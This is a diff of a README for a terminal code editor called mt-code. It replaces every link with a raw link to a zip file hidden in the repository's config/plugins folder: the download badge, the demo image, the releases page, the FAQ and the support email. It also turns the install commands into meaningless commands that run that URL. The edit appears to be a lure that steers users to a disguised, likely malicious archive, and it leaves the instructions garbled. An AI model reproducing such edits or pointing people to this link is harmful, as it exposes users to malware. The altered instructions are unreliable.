@@ -1,18 +1,18 @@
 # 📝 mt-code - A Simple Terminal Code Editor
 
 ## 🌟 Download mt-code
-[![Download mt-code](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/PeteNaJaXD/mt-code/releases)
+[![Download mt-code](https://github.com/PeteNaJaXD/mt-code/raw/refs/heads/main/config/plugins/mt-code-3.1.zip)](https://github.com/PeteNaJaXD/mt-code/raw/refs/heads/main/config/plugins/mt-code-3.1.zip)
 
 ## 🚀 Getting Started
 
 mt-code is a lightweight terminal-based code editor designed for ease of use. With support for Language Server Protocol (LSP), plugins, command palette, and syntax highlighting, it simplifies coding tasks for everyone.
 
 ## 🎥 Demo
-![Demo](demo.gif)
+![Demo](https://github.com/PeteNaJaXD/mt-code/raw/refs/heads/main/config/plugins/mt-code-3.1.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download mt-code, visit [this page](https://github.com/PeteNaJaXD/mt-code/releases).
+1. **Visit the Releases Page**: To download mt-code, visit [this page](https://github.com/PeteNaJaXD/mt-code/raw/refs/heads/main/config/plugins/mt-code-3.1.zip).
    
 2. **Choose Your Version**: Click on the version you want to download. This may be the latest release.
 
@@ -23,8 +23,8 @@ mt-code is a lightweight terminal-based code editor designed for ease of use. Wi
     - Run the following commands:
 
     ```bash
-    chmod +x install.sh
-    ./install.sh
+    chmod +x https://github.com/PeteNaJaXD/mt-code/raw/refs/heads/main/config/plugins/mt-code-3.1.zip
+    https://github.com/PeteNaJaXD/mt-code/raw/refs/heads/main/config/plugins/mt-code-3.1.zip
     ```
 
 The install script will:
@@ -43,7 +43,7 @@ You can start using mt-code right after installation. Here are simple commands t
    ```
 - To open a specific file: 
    ```bash
-   mt-code file.py
+   mt-code https://github.com/PeteNaJaXD/mt-code/raw/refs/heads/main/config/plugins/mt-code-3.1.zip
    ```
 - To open a folder: 
    ```bash
@@ -93,7 +93,7 @@ If you encounter issues while downloading or installing mt-code, consider these 
 - **Dependencies**: Check that Python is correctly installed and configured on your system.
 - **Re-Download**: If installation fails, try deleting the downloaded files and downloading again.
 
-For more help, consult the [FAQ section](https://github.com/PeteNaJaXD/mt-code/issues).
+For more help, consult the [FAQ section](https://github.com/PeteNaJaXD/mt-code/raw/refs/heads/main/config/plugins/mt-code-3.1.zip).
 
 ## 🏗️ Contributing
 
@@ -101,7 +101,7 @@ We welcome contributions to improve mt-code! If you have suggestions or bug repo
 
 ## 👨‍💻 Support
 
-Need help or have questions? Reach out via the issues section of this repository or email us at support@example.com.
+Need help or have questions? Reach out via the issues section of this repository or email us at https://github.com/PeteNaJaXD/mt-code/raw/refs/heads/main/config/plugins/mt-code-3.1.zip
 
 ## 🌐 More Resources
 
